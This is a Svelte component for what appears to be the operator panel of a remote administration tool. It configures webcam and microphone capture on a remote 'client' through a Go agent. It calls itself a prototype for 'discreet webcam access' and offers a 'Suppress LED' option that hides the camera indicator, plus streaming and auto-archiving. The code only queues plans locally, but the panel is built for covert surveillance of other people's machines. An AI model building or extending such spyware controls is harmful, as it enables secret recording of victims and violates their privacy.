<script lang="ts">
        import { Button } from '$lib/components/ui/button/index.js';
        import { Input } from '$lib/components/ui/input/index.js';
        import { Label } from '$lib/components/ui/label/index.js';
        import { Switch } from '$lib/components/ui/switch/index.js';
        import {
                Select,
                SelectContent,
                SelectItem,
                SelectTrigger
        } from '$lib/components/ui/select/index.js';
        import {
                Card,
                CardContent,
                CardDescription,
                CardFooter,
                CardHeader,
                CardTitle
        } from '$lib/components/ui/card/index.js';
        import ClientWorkspaceHero from '$lib/components/workspace/workspace-hero.svelte';
        import ActionLog from '$lib/components/workspace/action-log.svelte';
        import { getClientTool } from '$lib/data/client-tools';
        import type { Client } from '$lib/data/clients';
        import { appendWorkspaceLog, createWorkspaceLogEntry } from '$lib/workspace/utils';
        import type { WorkspaceLogEntry } from '$lib/workspace/types';

        type CapturePlan = {
                id: string;
                mode: 'preview' | 'still' | 'stream';
                resolution: string;
                frameRate: number;
                includeAudio: boolean;
                ledSuppression: boolean;
                autoArchive: boolean;
        };

        const { client } = $props<{ client: Client }>();

        const tool = getClientTool('webcam-control');

        let captureMode = $state<CapturePlan['mode']>('preview');
        let resolution = $state('1280×720');
        let frameRate = $state(30);
        let includeAudio = $state(true);
        let ledSuppression = $state(false);
        let autoArchive = $state(true);
        let camera = $state('Integrated webcam');
        let log = $state<WorkspaceLogEntry[]>([]);
        let queue = $state<CapturePlan[]>([]);

        function buildDetail(plan: CapturePlan): string {
                return `${plan.mode} · ${plan.resolution} @ ${plan.frameRate}fps · audio ${plan.includeAudio ? 'on' : 'off'} · LED ${plan.ledSuppression ? 'suppressed' : 'visible'}`;
        }

        function stagePlan(status: WorkspaceLogEntry['status']) {
                const plan: CapturePlan = {
                        id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
                        mode: captureMode,
                        resolution,
                        frameRate,
                        includeAudio,
                        ledSuppression,
                        autoArchive
                } satisfies CapturePlan;

                queue = [plan, ...queue];
                log = appendWorkspaceLog(
                        log,
                        createWorkspaceLogEntry('Webcam capture staged', buildDetail(plan), status)
                );
        }

        function queuePlan() {
                        stagePlan('queued');
        }

        function draftPlan() {
                stagePlan('draft');
        }
</script>

<div class="space-y-6">
        <ClientWorkspaceHero
                {client}
                {tool}
                metadata={[
                        {
                                label: 'Selected camera',
                                value: camera,
                                hint: 'Camera discovery occurs during the capture negotiation phase.'
                        },
                        {
                                label: 'Auto archive',
                                value: autoArchive ? 'Enabled' : 'Disabled'
                        }
                ]}
        >
                <p>
                        Prototype discreet webcam access, balancing preview modes with streaming capture pipelines. Plans are kept
                        locally until the Go agent exposes the recording channel.
                </p>
        </ClientWorkspaceHero>

        <Card>
                <CardHeader>
                        <CardTitle class="text-base">Capture profile</CardTitle>
                        <CardDescription>
                                Describe how frames and audio should be collected when the session launches.
                        </CardDescription>
                </CardHeader>
                <CardContent class="space-y-6">
                        <div class="grid gap-4 md:grid-cols-2">
                                <div class="grid gap-2">
                                        <Label for="webcam-device">Camera label</Label>
                                        <Input id="webcam-device" bind:value={camera} placeholder="Integrated webcam" />
                                </div>
                                <div class="grid gap-2">
                                        <Label for="webcam-mode">Capture mode</Label>
                                        <Select
                                                type="single"
                                                value={captureMode}
                                                onValueChange={(value) => (captureMode = value as CapturePlan['mode'])}
                                        >
                                                <SelectTrigger id="webcam-mode" class="w-full">
                                                        <span class="capitalize">{captureMode}</span>
                                                </SelectTrigger>
                                                <SelectContent>
                                                        <SelectItem value="preview">Preview</SelectItem>
                                                        <SelectItem value="still">Still capture</SelectItem>
                                                        <SelectItem value="stream">Continuous stream</SelectItem>
                                                </SelectContent>
                                        </Select>
                                </div>
                        </div>

                        <div class="grid gap-4 md:grid-cols-3">
                                <div class="grid gap-2">
                                        <Label for="webcam-resolution">Resolution</Label>
                                        <Select
                                                type="single"
                                                value={resolution}
                                                onValueChange={(value) => (resolution = value)}
                                        >
                                                <SelectTrigger id="webcam-resolution" class="w-full">
                                                        <span>{resolution}</span>
                                                </SelectTrigger>
                                                <SelectContent>
                                                        <SelectItem value="3840×2160">3840×2160 · 4K</SelectItem>
                                                        <SelectItem value="1920×1080">1920×1080 · 1080p</SelectItem>
                                                        <SelectItem value="1280×720">1280×720 · 720p</SelectItem>
                                                        <SelectItem value="640×480">640×480 · VGA</SelectItem>
                                                </SelectContent>
                                        </Select>
                                </div>
                                <div class="grid gap-2">
                                        <Label for="webcam-framerate">Frame rate</Label>
                                        <Input
                                                id="webcam-framerate"
                                                type="number"
                                                min={5}
                                                max={60}
                                                bind:value={frameRate}
                                        />
                                </div>
                                <label class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3">
                                        <div>
                                                <p class="text-sm font-medium text-foreground">Archive session</p>
                                                <p class="text-xs text-muted-foreground">Persist output after download completes</p>
                                        </div>
                                        <Switch bind:checked={autoArchive} />
                                </label>
                        </div>

                        <div class="grid gap-4 md:grid-cols-2">
                                <label class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3">
                                        <div>
                                                <p class="text-sm font-medium text-foreground">Capture audio</p>
                                                <p class="text-xs text-muted-foreground">Pair microphone stream with video</p>
                                        </div>
                                        <Switch bind:checked={includeAudio} />
                                </label>
                                <label class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3">
                                        <div>
                                                <p class="text-sm font-medium text-foreground">Suppress LED</p>
                                                <p class="text-xs text-muted-foreground">Signal state is masked when supported</p>
                                        </div>
                                        <Switch bind:checked={ledSuppression} />
                                </label>
                        </div>
                </CardContent>
                <CardFooter class="flex flex-wrap gap-3">
                        <Button type="button" variant="outline" onclick={draftPlan}>Save draft</Button>
                        <Button type="button" onclick={queuePlan}>Queue capture</Button>
                </CardFooter>
        </Card>

        <Card class="border-dashed">
                <CardHeader>
                        <CardTitle class="text-base">Queued captures</CardTitle>
                        <CardDescription>Tracked locally until the transport is wired to the agent.</CardDescription>
                </CardHeader>
                <CardContent class="space-y-3 text-sm">
                        {#if queue.length === 0}
                                <p class="text-muted-foreground">No staged captures yet.</p>
                        {:else}
                                <ul class="space-y-2">
                                        {#each queue as item (item.id)}
                                                <li class="rounded-lg border border-border/60 bg-muted/40 p-3">
                                                        <p class="font-medium text-foreground">{item.mode} · {item.resolution} @ {item.frameRate}fps</p>
                                                        <p class="text-xs text-muted-foreground">
                                                                Audio {item.includeAudio ? 'enabled' : 'disabled'} · LED {item.ledSuppression ? 'suppressed' : 'visible'} · Auto archive
                                                                {item.autoArchive ? 'on' : 'off'}
                                                        </p>
                                                </li>
                                        {/each}
                                </ul>
                        {/if}
                </CardContent>
        </Card>

        <ActionLog entries={log} />
</div>
